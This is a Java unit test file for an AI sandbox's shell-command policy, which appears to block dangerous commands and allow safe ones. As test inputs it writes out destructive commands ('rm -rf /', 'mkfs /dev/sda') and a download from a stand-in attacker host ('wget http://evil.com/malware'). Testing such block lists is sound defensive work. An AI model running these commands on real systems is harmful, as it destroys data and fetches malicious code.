package org.wall.im.ai.sandbox.policy;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.wall.im.ai.core.sandbox.policy.CompositeCommandPolicy;
import org.wall.im.ai.core.sandbox.policy.RegexWhitelistPolicy;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * DefaultCommandPolicy 单元测试
 */
@DisplayName("DefaultCommandPolicy测试")
class DefaultCommandPolicyTest {

	@Test
	@DisplayName("rm -rf / 应被拦截（向后兼容旧黑名单）")
	void rmRfRoot_shouldBeBlocked() {
		assertFalse(new DefaultCommandPolicy().isAllowed("rm -rf /"));
	}

	@Test
	@DisplayName("wget 应被拦截")
	void wget_shouldBeBlocked() {
		assertFalse(new DefaultCommandPolicy().isAllowed("wget http://evil.com/malware"));
	}

	@Test
	@DisplayName("mkfs 应被拦截")
	void mkfs_shouldBeBlocked() {
		assertFalse(new DefaultCommandPolicy().isAllowed("mkfs /dev/sda"));
	}

	@Test
	@DisplayName("大小写不敏感：RM -RF / 应被拦截")
	void caseInsensitive_shouldBeBlocked() {
		assertFalse(new DefaultCommandPolicy().isAllowed("RM -RF /"));
	}

	@Test
	@DisplayName("curl -o 应被拦截")
	void curlO_shouldBeBlocked() {
		assertFalse(new DefaultCommandPolicy().isAllowed("curl -o /tmp/x http://x"));
	}

	@Test
	@DisplayName("安全命令 echo 应通过")
	void echo_shouldPass() {
		assertTrue(new DefaultCommandPolicy().isAllowed("echo hello"));
	}

	@Test
	@DisplayName("安全命令 ls 应通过")
	void ls_shouldPass() {
		assertTrue(new DefaultCommandPolicy().isAllowed("ls -la"));
	}

	@Test
	@DisplayName("networkRestricted=true 时 scp 应被拦截")
	void networkRestricted_scp_shouldBeBlocked() {
		assertFalse(new DefaultCommandPolicy(true).isAllowed("scp file host:/path"));
	}

	@Test
	@DisplayName("networkRestricted=false 时 scp 不被默认黑名单拦截")
	void networkNotRestricted_scp_shouldPass() {
		assertTrue(new DefaultCommandPolicy(false).isAllowed("scp file host:/path"));
	}

	@Test
	@DisplayName("链式 add RegexWhitelistPolicy 后白名单生效：echo 通过，ls 被拒")
	void addWhitelist_shouldEnforce() {
		CompositeCommandPolicy policy = new DefaultCommandPolicy();
		policy.add(new RegexWhitelistPolicy("^echo\\b.*"));
		assertTrue(policy.isAllowed("echo hello"));
		assertFalse(policy.isAllowed("ls -la"));
	}

	@Test
	@DisplayName("getPolicyName 返回 default")
	void policyName_shouldBeDefault() {
		assertEquals("default", new DefaultCommandPolicy().getPolicyName());
	}

}
